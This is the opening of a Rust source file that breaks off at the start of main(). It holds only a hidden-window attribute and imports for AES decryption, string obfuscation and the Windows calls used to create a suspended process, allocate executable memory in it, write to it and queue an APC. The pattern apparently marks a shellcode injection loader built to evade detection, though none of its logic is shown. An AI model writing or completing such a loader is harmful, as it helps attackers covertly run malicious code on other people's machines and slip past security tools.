#![windows_subsystem = "windows"]

use libaes::Cipher;
use std::ptr::{null, null_mut};
use windows::Win32::Foundation::{BOOL, CloseHandle, GetLastError};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{VirtualAllocEx, MEM_RESERVE, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Threading::{CreateProcessW,CREATE_SUSPENDED,CREATE_NO_WINDOW, STARTUPINFOW, PROCESS_INFORMATION, QueueUserAPC, ResumeThread};
use windows::Win32::Security::SECURITY_ATTRIBUTES;
use std::mem::{zeroed, size_of};
use windows::core::{PCWSTR, PWSTR};
use obfstr::obfstr;

fn main() {
